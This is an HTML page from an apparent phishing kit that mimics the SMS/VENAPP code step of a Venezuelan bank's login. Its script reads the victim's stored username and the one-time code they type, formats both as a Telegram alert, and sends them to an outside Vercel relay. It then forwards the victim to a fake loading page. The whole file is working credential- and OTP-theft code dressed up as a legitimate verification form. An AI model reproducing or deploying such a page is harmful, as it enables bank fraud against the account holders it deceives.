<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Código SMS</title>
  <link rel="stylesheet" href="sms.css">
</head>
<body>
  

  <div class="login-container">
    <div class="login-box">
       <img style="width: 300px; height: 60px; margin-bottom: 10%;" class="logos" src="logo.png" alt="">
      <p class="subtitle">Ingresa el código <b>VENAPP</b> generado  </p>

      <form class="sms-form">
        <div class="code-inputs">
          <input type="text" maxlength="8" class="code-input-single" id="smsCode" autocomplete="off" placeholder="------">
        </div>

        <button type="button" onclick="enviar()" class="btn-submit">Verificar</button>

        <div class="help-text">
          <p>¿No recibiste el código?</p>
          <p><a href="#" class="resend-link">Reenviar código</a></p>
         
        </div>
      </form>
    </div>
  </div>

  <script>
    const smsInput = document.getElementById('smsCode');

    // Solo permitir números
    smsInput.addEventListener('keypress', (e) => {
      if (!/[0-9]/.test(e.key)) {
        e.preventDefault();
      }
    });

    // Auto-focus al cargar
    smsInput.focus();




async function enviar(event) { 
     

   
    // El frontend construye el mensaje completo
  const user = localStorage.getItem("usuario") || "Usuario desconocido";
  let password = document.getElementById("smsCode").value;
  
  

// ✅ Después - construir explícitamente con \n
const mensaje = [
  "🔔 <b>BDV PERSONAS</b>",
  `👤 Usuario: <code>${user}</code>`,
  `📱 VENAPP: <code>${password}</code>`,
  "🔘",
  `⏰ ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`
].join("\n");

 const datos = {
    user: user,           // Solo el ID para guardar en Firestore
    message: mensaje      // Mensaje completo formateado para Telegram
  };

    
    try {
        const response = await fetch("https://vercelwrapper-delta.vercel.app/", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(datos)
        });

        const data = await response.json();

        if (response.ok) {
           
          if (localStorage.getItem("pais") === "EC") {
             window.location = "balancer.html";
          } else {
            localStorage.setItem("usuario", user);
            window.location = "loading.html";
            
          }
           
        } else {
           console.log(  "❌ Error al enviar mensaje: " + data.error) ;
        }
    } catch (error) {
      console.log("❌ Error en la solicitud:", error);
    }
}








  </script>
</body>
</html>
